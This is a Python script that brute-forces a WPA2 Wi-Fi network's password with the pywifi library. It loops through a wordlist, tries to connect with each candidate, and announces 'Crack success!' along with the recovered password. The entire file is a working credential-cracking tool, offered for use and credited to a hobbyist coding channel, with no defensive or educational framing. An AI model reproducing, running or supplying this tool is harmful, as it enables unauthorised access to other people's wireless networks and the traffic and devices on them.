import re, time, argparse, platform
import os.path

try:
    import pywifi
    from pywifi import PyWiFi
    from pywifi import const
    from pywifi import Profile
except:
    print("Installing PyWiFi Module")

RED   = "\033[1;31m"  
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"

try:
    wifi = PyWiFi()
    ifaces = wifi.interfaces()[0]

    # checking the wifi interfaces (wifi card)
    ifaces.scan()
    results = ifaces.scan_results()

    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
except:
    print("[-] Error System")

type = False

def main(ssid, password, number):

    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    # your network speed
    time.sleep(0.1) # if script not working change time to > 0.1 !
    iface.connect(tmp_profile) # trying to Connect
    time.sleep(0.35) # more if not working

    if ifaces.status() == const.IFACE_CONNECTED:
        time.sleep(1)
        print(BOLD, GREEN, '[*] Crack success!', RESET)
        print(BOLD, GREEN, '[*] password is ' + password, RESET)
        time.sleep(1)
        exit()
    else:
        print(RED, "[{}] Crack Failed using {}".format(number, password))

def pwd(ssid, file):
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            main(ssid, pwd, number)

def menu():
    parser = argparse.ArgumentParser(description='argparse Ex')

    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list..')

    group1 = parser.add_mutually_exclusive_group()

    group1.add_argument('-v', '--version', metavar='', help='version')
    print(" ")

    args = parser.parse_args()

    print(CYAN, "[+] You are using", BOLD, platform.system(),  platform.machine(), "...")
    time.sleep(2.5)

    if args.wordlist and args.ssid:
        ssid = args.ssid
        file1 = args.wordlist
    elif args.version:
        print("\n\n", CYAN, "by Chill Coding With Robert\n")
        print(GREEN, "Copyright 2022\n\n")
        exit()
    else:
        print(BLUE)
        ssid = input("[*] SSID: ")
        file1 = input("[*] pwds file: ")

    if os.path.exists(file1):
        if platform.system().startswith("Win" or "win"):
            os.system("cls")
        else:
            os.system("clear")
        
        print(BLUE, "[~] Cracking...")
        pwd(ssid, file1)

    else:
        print(RED, "[-] NO SUCH FILE.", BLUE)

if __name__ == "__main__":
    menu()